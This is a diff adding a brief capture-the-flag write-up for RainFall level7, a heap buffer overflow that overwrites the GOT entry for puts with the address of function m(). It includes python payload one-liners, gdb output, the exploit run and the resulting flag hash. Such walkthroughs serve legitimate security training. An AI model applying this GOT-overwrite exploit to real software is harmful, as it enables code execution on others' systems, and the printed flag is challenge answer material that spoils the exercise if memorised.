@@ -1,0 +1,20 @@
+this level is a buffer overflow on the heap, where we write in the got table through strcpy
+
+python -c 'import sys; sys.stdout.write("AAAABBBBCCCCDDDDEEEE\x28\x99\x04\x08")' > /tmp/arg1
+
+\x28\x99\x04\x08 is the address of puts on the GOT, where we wanto replace by function m()
+
+(gdb) x m
+0x80484f4 <m>:	0x83e5895
+
+python -c 'import sys; sys.stdout.write("\xf4\x84\x04\x08")' > /tmp/arg2
+
+
+level7@RainFall:~$ ./level7 $(cat /tmp/arg1) $(cat /tmp/arg2)
+5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
+ - 1670853468
+
+
+so puts got is replaced by address of m which print the value of the address where gets() store the content of read ;)
+
+https://www.youtube.com/watch?v=TfJrU95q1J4
